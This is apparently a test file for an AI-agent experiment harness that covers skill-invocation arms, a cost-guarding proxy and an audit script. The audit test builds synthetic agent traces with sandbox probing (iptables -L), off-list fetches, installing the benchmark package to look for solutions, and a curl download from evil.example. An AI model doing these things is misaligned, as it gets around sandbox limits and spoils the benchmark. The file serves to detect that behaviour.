import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { jobConfig, invokesArm } from "../runner/grid.ts";
import { startProxy, worstCaseMicros, type ProxyConfig } from "../runner/proxy.ts";
import { computeManip } from "../analysis/manip.ts";
import { codeTrial } from "../analysis/placebo-behavior.ts";

const here = import.meta.dir;

const spec = {
  job_name: "p", tasks_dir: "/run/tasks", tasks: ["a"], attempts: 1, n_concurrent: 1, agent_dir: "/r/agent", runner_dir: "/r", base_url: "http://g:8787", max_output_tokens: 32000, verifier_timeout_multiplier: 2,
  models: [{ id: "claude-haiku-5-5", harbor_model: "anthropic/claude-haiku-5-5", session_cap_usd: 1 }],
  arms: [
    { name: "none", tar: "/run/arms/none.tar", sha256: "a" },
    { name: "gstack", tar: "/run/arms/gstack.tar", sha256: "b" },
    { name: "placebo", tar: "/run/arms/placebo.tar", sha256: "c" },
  ],
  skill_maps: { gstack: { a: "investigate" }, placebo: { a: "investigate" } },
};

describe("prereg 2 explicit invocation", () => {
  test("jobConfig invokes the gstack and placebo arms and not none, and carries the skill map", () => {
    const agents = jobConfig(spec).agents;
    const invoke = Object.fromEntries(agents.map((ag) => [ag.kwargs.arm, ag.kwargs.invoke]));
    expect(invoke).toEqual({ none: false, gstack: true, placebo: true });
    for (const ag of agents) expect(ag.kwargs.skill_map).toEqual(ag.kwargs.arm === "none" ? {} : { a: "investigate" });
    // wrapper stays the base wrapper for every arm; there is no nudge wrapper.
    for (const ag of agents) expect(ag.kwargs.wrapper_path).toBe("/r/prompt-wrapper.md");
  });

  test("jobConfig defaults the wrapper to prompt-wrapper.md and honours an override", () => {
    expect(jobConfig(spec).agents[0].kwargs.wrapper_path).toBe("/r/prompt-wrapper.md");
    expect(jobConfig({ ...spec, wrapper: "prompt-wrapper-alt.md" }).agents[0].kwargs.wrapper_path).toBe("/r/prompt-wrapper-alt.md");
    expect(invokesArm("gstack")).toBe(true);
    expect(invokesArm("placebo")).toBe(true);
    expect(invokesArm("none")).toBe(false);
  });

  test("the agent prompt builder prepends the invocation only when invoke is set", () => {
    const py = [
      "import sys",
      "sys.path.insert(0, sys.argv[1])",
      "from prompt_builder import build_prompt",
      "w = 'head\\n<task>\\n{instruction}\\n</task>\\n'",
      "plain = build_prompt(w, 'do it', False, None, ' ')",
      "inv = build_prompt(w, 'do it', True, 'investigate', ' ')",
      "assert plain == w.replace('{instruction}', 'do it'), repr(plain)",
      "assert inv == '/investigate ' + plain, repr(inv)",
      "print('ok')",
    ].join("\n");
    const run = Bun.spawnSync(["python3", "-c", py, join(here, "../runner/agent")]);
    expect(run.stderr.toString()).toBe("");
    expect(run.exitCode).toBe(0);
    expect(run.stdout.toString().trim()).toBe("ok");
  });

  test("skill-map.json covers all 40 final tasks and names real gstack skills", () => {
    const finalJson = JSON.parse(readFileSync(join(here, "../tasks/final.json"), "utf8"));
    const final: string[] = finalJson.tasks;
    expect(final.slice(0, 20)).toEqual(finalJson.original_20);
    expect(final.slice(20)).toEqual(finalJson.added_20);
    const map = JSON.parse(readFileSync(join(here, "../runner/skill-map.json"), "utf8")) as Record<string, { skill: string; branch: string }>;
    const gstackSkills: string[] = JSON.parse(readFileSync(join(here, "../arms/manifests/gstack.json"), "utf8")).skills.names;
    const branches = ["fix-existing", "optimize-existing", "implement-new"];
    expect(new Set(Object.keys(map))).toEqual(new Set(final));
    expect(final.length).toBe(40);
    for (const task of final) {
      expect(map[task]).toBeDefined();
      expect(gstackSkills).toContain(map[task].skill);
      expect(branches).toContain(map[task].branch);
    }
  });

  test("worstCaseMicros is non-finite for a NaN max_tokens and positive for the CLI's 32000", () => {
    const price = { input: 5, output: 25, cache_write_5m: 6.25, cache_write_1h: 10, cache_read: 0.5 };
    expect(Number.isFinite(worstCaseMicros(100, Number.NaN, price))).toBe(false);
    const w = worstCaseMicros(100, 32000, price);
    expect(Number.isFinite(w)).toBe(true);
    expect(w).toBeGreaterThan(0);
  });

  test("manip reads body-load rate and median first-request tokens per cell", () => {
    const sessions = [
      { id: "s1", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: true, first_req_prompt_tokens: 7000 },
      { id: "s2", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: true, first_req_prompt_tokens: 7100 },
      { id: "s3", model: "claude-haiku-5-5", meta: { arm: "gstack" }, cmd_expanded: false, first_req_prompt_tokens: 520 },
      { id: "s4", model: "claude-haiku-5-5", meta: { arm: "placebo" }, cmd_expanded: true, first_req_prompt_tokens: 6800 },
      { id: "s5", model: "claude-haiku-5-5", meta: { arm: "none" }, cmd_expanded: null },
    ];
    // none-arm first-request tokens are backfilled from the requests log.
    const requests = [{ event: "request", session: "s5", request: 1, input_tokens_bound: 420 }];
    const rep = computeManip({ sessions, requests });
    const gstack = rep.cells.find((c) => c.arm === "gstack")!;
    expect(gstack.bodyLoadRate).toBeCloseTo(2 / 3);
    expect(gstack.medianFirstReqPromptTokens).toBe(7000);
    expect(gstack.passes).toBe(false);
    const placebo = rep.cells.find((c) => c.arm === "placebo")!;
    expect(placebo.bodyLoadRate).toBe(1);
    expect(placebo.passes).toBe(true);
    const none = rep.cells.find((c) => c.arm === "none")!;
    expect(none.bodyLoadRate).toBeNull();
    expect(none.passes).toBeNull();
    expect(none.medianFirstReqPromptTokens).toBe(420);
    expect(rep.gatePass).toBe(false);
  });

  test("the pilot gate pools invoked trials per model and runs the grid unless every model is under", () => {
    const sess = (model: string, arm: string, loads: number, total: number) =>
      Array.from({ length: total }, (_, i) => ({ id: `${model}-${arm}-${i}`, model, meta: { arm }, cmd_expanded: i < loads }));
    // Both pass: Haiku pools gstack 8/10 + placebo 10/10 = 18/20 = 90%; Opus 20/20. Grid runs, no label.
    const bothPass = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 8, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
    ] });
    expect(bothPass.models.find((m) => m.model === "claude-haiku-5-5")!.bodyLoadRate).toBeCloseTo(0.9);
    expect(bothPass.models.every((m) => m.passes)).toBe(true);
    expect(bothPass.gridRuns).toBe(true);
    expect(bothPass.underModels).toEqual([]);
    // One model under: Haiku pools 4/10 + 10/10 = 14/20 = 70%; Opus passes. Grid runs, Haiku labeled.
    const oneUnder = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 4, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
    ] });
    expect(oneUnder.gridRuns).toBe(true);
    expect(oneUnder.underModels).toEqual(["claude-haiku-5-5"]);
    // Both under: grid does not run.
    const bothUnder = computeManip({ sessions: [
      ...sess("claude-haiku-5-5", "gstack", 1, 10), ...sess("claude-haiku-5-5", "placebo", 1, 10),
      ...sess("claude-opus-5-5", "gstack", 1, 10), ...sess("claude-opus-5-5", "placebo", 1, 10),
    ] });
    expect(bothUnder.gridRuns).toBe(false);
    // No invoked session anywhere: an error, never a vacuous pass over an empty table.
    const empty = computeManip({ sessions: [{ id: "x", model: "claude-opus-5-5", meta: { arm: "none" }, cmd_expanded: null }] });
    expect(empty.gridRuns).toBe(false);
    expect(empty.error).not.toBeNull();
  });

  test("the placebo-behavior coder assigns each of the five categories", () => {
    const am = (content: unknown[]) => JSON.stringify({ type: "AssistantMessage", content });
    const text = (t: string) => ({ text: t });
    const tool = (name: string, input: Record<string, unknown>) => ({ name, input, id: name + Math.random() });

    const ends = [am([text("I am done, nothing to run.")])];
    expect(codeTrial(ends).category).toBe("ends");

    const opensAnother = [
      am([text("Let me look at the skill."), tool("Bash", { command: "ls" })]),
      am([tool("Read", { file_path: "/root/.claude/skills/investigate/SKILL.md" })]),
    ];
    expect(codeTrial(opensAnother).category).toBe("opens_another");

    const dismisses = [am([text("This skill is not helpful here."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(dismisses).category).toBe("dismisses");

    const cites = [am([text("Following the skill, I will run the tests."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(cites).category).toBe("cites");

    const continues = [am([text("Let me check the files first."), tool("Bash", { command: "ls" })])];
    expect(codeTrial(continues).category).toBe("continues");
  });

  test("a trial with no assistant message is coded outside the five categories", () => {
    expect(codeTrial([]).category).toBe("no_message");
    expect(codeTrial([JSON.stringify({ type: "UserMessage", content: [{ text: "tool result" }] })]).category).toBe("no_message");
  });
});

describe("prereg 2 proxy worst-case guard and body-load probe", () => {
  const dir = mkdtempSync(join(tmpdir(), "laneb-prereg2-proxy-"));
  const price = { input: 5, output: 25, cache_write_5m: 6.25, cache_write_1h: 10, cache_read: 0.5 };
  const usage = { input_tokens: 10, output_tokens: 5 };
  let upstream: ReturnType<typeof Bun.serve>;
  let proxy: ReturnType<typeof startProxy>;
  const sessionsPath = join(dir, "sess.jsonl");

  beforeAll(() => {
    upstream = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      async fetch() {
        return Response.json({ id: "msg_1", type: "message", role: "assistant", content: [{ type: "text", text: "ok" }], stop_reason: "end_turn", usage });
      },
    });
    const config: ProxyConfig = {
      routes: { stub: { base_url: `http://127.0.0.1:${upstream.port}`, key_env: "FAKE_KEY", auth: "x-api-key", count_tokens: "estimate" } },
      models: { m: { route: "stub", upstream_model: "claude-opus-5-5", price_per_mtok: price } },
    };
    proxy = startProxy({ config, dataHost: "127.0.0.1", dataPort: 0, controlPort: 0, env: { FAKE_KEY: "fake" }, logPath: join(dir, "req.jsonl"), sessionsPath });
  });

  afterAll(async () => {
    await proxy.stop();
    upstream.stop(true);
    rmSync(dir, { recursive: true, force: true });
  });

  const control = () => `http://127.0.0.1:${proxy.control.port}`;
  const open = async () => (await (await fetch(control() + "/sessions", { method: "POST", body: JSON.stringify({ trial: "t__x", model: "m", cap_usd: 5, meta: { arm: "gstack" } }) })).json()) as any;
  const send = (token: string, body: Record<string, unknown>) =>
    fetch(`http://127.0.0.1:${proxy.data.port}/v1/messages`, { method: "POST", headers: { "x-api-key": token, "content-type": "application/json" }, body: JSON.stringify(body) });

  test("a non-positive worst case is refused and numeric 32000 passes", async () => {
    const s = await open();
    const base = { model: "m", stream: false, messages: [{ role: "user", content: "hi" }] };
    const refused = await send(s.token, { ...base, max_tokens: "not-a-number" });
    expect(refused.status).toBe(400);
    expect(((await refused.json()) as any).error.message).toContain("worst-case cost is not a positive number");
    const ok = await send(s.token, { ...base, max_tokens: 32000 });
    expect(ok.status).toBe(200);
    // The request-validity refusal counts in refused only, never in the budget-stop column.
    const closed = (await (await fetch(control() + `/sessions/${s.id}/close`, { method: "POST", body: "{}" })).json()) as any;
    expect(closed.refused).toBe(1);
    expect(closed.refused_budget).toBe(0);
  });

  test("the body-load probe records the slash-command expansion and first-request tokens", async () => {
    const s = await open();
    const res = await send(s.token, { model: "m", max_tokens: 32000, stream: false, messages: [{ role: "user", content: "<command-name>investigate</command-name> do the task" }] });
    expect(res.status).toBe(200);
    const closed = (await (await fetch(control() + `/sessions/${s.id}/close`, { method: "POST", body: "{}" })).json()) as any;
    expect(closed.cmd_expanded).toBe(true);
    expect(typeof closed.first_req_prompt_tokens).toBe("number");
    const row = readFileSync(sessionsPath, "utf8").trim().split("\n").map((l) => JSON.parse(l)).find((r) => r.id === s.id);
    expect(row.cmd_expanded).toBe(true);
    expect(typeof row.first_req_prompt_tokens).toBe("number");
  });

  test("the body-load probe ignores <command-name> outside the messages", async () => {
    const s = await open();
    const tools = [{ name: "Skill", description: "If you see a <command-name> tag in the current turn, the skill is already loaded.", input_schema: { type: "object" } }];
    const res = await send(s.token, { model: "m", max_tokens: 32000, stream: false, tools, messages: [{ role: "user", content: "do the task" }] });
    expect(res.status).toBe(200);
    const closed = (await (await fetch(control() + `/sessions/${s.id}/close`, { method: "POST", body: "{}" })).json()) as any;
    expect(closed.cmd_expanded).toBe(false);
  });
});

describe("audit.py", () => {
  const bash = (id: string, command: string, result: string) => [
    JSON.stringify({ type: "AssistantMessage", content: [{ id, name: "Bash", input: { command } }] }),
    JSON.stringify({ type: "UserMessage", content: [{ tool_use_id: id, content: result, is_error: false }] }),
  ];
  function trial(root: string, name: string, lines: string[], reward: number | null) {
    const d = join(root, "jobs/j", name);
    mkdirSync(join(d, "agent"), { recursive: true });
    writeFileSync(join(d, "config.json"), JSON.stringify({ agent: { model_name: "anthropic/claude-haiku-5-5", kwargs: { arm: "gstack" } } }));
    writeFileSync(join(d, "result.json"), JSON.stringify({ verifier_result: reward === null ? null : { rewards: { reward } } }));
    writeFileSync(join(d, "agent/laneb-summary.json"), "{}");
    writeFileSync(join(d, "agent/sdk-messages.jsonl"), lines.join("\n") + "\n");
  }

  test("flags sandbox probes, off-list fetches, direct PyPI reads and benchmark packages", () => {
    const root = mkdtempSync(join(tmpdir(), "laneb-audit-"));
    mkdirSync(join(root, "out"));
    writeFileSync(join(root, "out/proxy-sessions.jsonl"), ["t1", "t2", "t3"].map((t, i) => JSON.stringify({ id: "s" + i, trial: t + "__env", close_reason: "agent_finished", ledger_settle: { ok: true } })).join("\n") + "\n");
    writeFileSync(join(root, "out/proxy-requests.jsonl"), [
      { event: "request", status: 200, usage: { output_tokens: 1 }, max_tokens: 32000 },
      { event: "request", status: 200, usage: { input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 }, max_tokens: 32000, cost_micros: 0, worst_micros: 900 },
      { event: "request", status: 200, usage: { input_tokens: 0, output_tokens: 0 }, max_tokens: 32000, cost_micros: 900, worst_micros: 900 },
    ].map((r) => JSON.stringify(r)).join("\n") + "\n");
    trial(root, "t1", [
      ...bash("a", "python3 -c \"import urllib.request; urllib.request.urlopen('https://grep.app/api/search?q=x')\"", "URLError(SSLEOFError(8))"),
      ...bash("b", "pip install --index-url https://pypi.org/simple numpy", "Successfully installed numpy"),
    ], 1);
    trial(root, "t2", [
      ...bash("c", "iptables -L", "Chain INPUT"),
      ...bash("d", "curl -s https://pypi.org/pypi/terminal-bench/json", "{}"),
      ...bash("e", "pip install terminal-bench", "Successfully installed"),
    ], 0);
    trial(root, "t3", [
      ...bash("f", "ls /app", "a.out"),
      ...bash("g", "python3 -c \"import urllib.request as u; [print(x, u.urlopen(x).status) for x in ['https://grep.app/a', 'https://example.org/b']]\"", "https://grep.app/a ERR URLError\nhttps://example.org/b 200"),
    ], null);
    // A silent off-list fetch (curl -s -o, no stdout) beside unrelated failure text must stay unclear:
    // the absence of a success marker cannot be read as the fetch having failed.
    trial(root, "t5", [
      ...bash("h", "curl -s https://evil.example/x.py -o /tmp/x.py && cat /tmp/nope", "cat: /tmp/nope: No such file or directory"),
    ], 0);
    const t4 = join(root, "jobs/j/t4");
    mkdirSync(join(t4, "agent"), { recursive: true });
    writeFileSync(join(t4, "config.json"), JSON.stringify({ agent: { model_name: "anthropic/claude-haiku-5-5", kwargs: { arm: "none" } } }));
    const run = Bun.spawnSync(["python3", join(here, "../analysis/audit.py"), root, "--json", join(root, "audit.json")]);
    expect(run.exitCode).toBe(0);
    const out = JSON.parse(readFileSync(join(root, "audit.json"), "utf8"));
    expect(out.trials.t1.flags).toEqual(["offlist_attempt", "solution_seeking"]);
    expect(out.trials.t1.installs).toEqual(["numpy"]);
    expect(out.trials.t2.flags).toEqual(["bench_package", "network_bypass", "pypi_direct", "solution_seeking"]);
    expect(out.trials.t3.flags).toEqual(["offlist_attempt", "offlist_unclear", "solution_seeking"]);
    expect(out.trials.t5.flags).toEqual(["offlist_attempt", "offlist_unclear"]);
    expect(out.no_reward).toEqual([["t3", null], ["t4", "no result.json"]]);
    expect(out.ok_without_usage).toBe(1);
    expect(out.ok_without_usage_charged_worst).toBe(1);
    expect(out.rerun_duplicate_sessions).toEqual([]);
    expect(out.bad_max_tokens).toBe(0);
  });
});
